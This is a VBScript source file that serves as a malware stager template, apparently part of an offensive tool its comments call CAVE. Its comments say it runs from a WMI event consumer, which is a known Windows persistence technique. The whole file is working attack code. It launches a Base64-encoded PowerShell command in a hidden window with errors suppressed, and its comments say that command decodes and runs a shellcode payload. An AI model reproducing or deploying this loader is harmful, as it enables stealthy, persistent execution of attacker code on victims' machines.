' wmi_payload_runner.vbs
' This script is designed to be executed by a WMI event consumer.
' It receives a Base64 encoded PowerShell command and executes it.
' The PowerShell command itself is expected to contain the logic
' for decoding/decrypting and running the final payload (shellcode).

Option Explicit

Dim strEncodedPowerShellCommand
Dim objShell
Dim intWindowStyle
Dim bWaitOnReturn

' This placeholder will be replaced by the Python script (CAVE)
' with the Base64 encoded PowerShell command.
strEncodedPowerShellCommand = "{{ powershell_command_b64 }}"

' --- Configuration for WScript.Shell.Run ---
' 0 = Hide the window and activate another window.
' See: https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/ateytk4a(v=vs.84)
intWindowStyle = 0

' False = The script does not wait for the program to finish executing before continuing to the next statement.
' True = Script execution halts until the program finishes, then returns any error code returned by the program.
bWaitOnReturn = False

' Basic error handling
On Error Resume Next

Set objShell = CreateObject("WScript.Shell")

If Err.Number <> 0 Then
    ' Failed to create WScript.Shell object. Cannot proceed.
    ' In a real scenario, you might log this failure.
    WScript.Quit(1) ' Exit with an error code
End If

' Construct the command to execute PowerShell with the encoded command.
' -NoProfile: Does not load the Windows PowerShell profile.
' -WindowStyle Hidden: Hides the PowerShell window. (intWindowStyle=0 also does this for Run)
' -EncodedCommand: Accepts a base-64-encoded string version of a command.
objShell.Run "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " & strEncodedPowerShellCommand, intWindowStyle, bWaitOnReturn

If Err.Number <> 0 Then
    ' An error occurred while trying to run the PowerShell command.
    ' Optional: Log this error.
    ' WScript.Echo "Error running PowerShell: " & Err.Description
    Set objShell = Nothing
    WScript.Quit(1) ' Exit with an error code
End If

Set objShell = Nothing
WScript.Quit(0) ' Exit successfully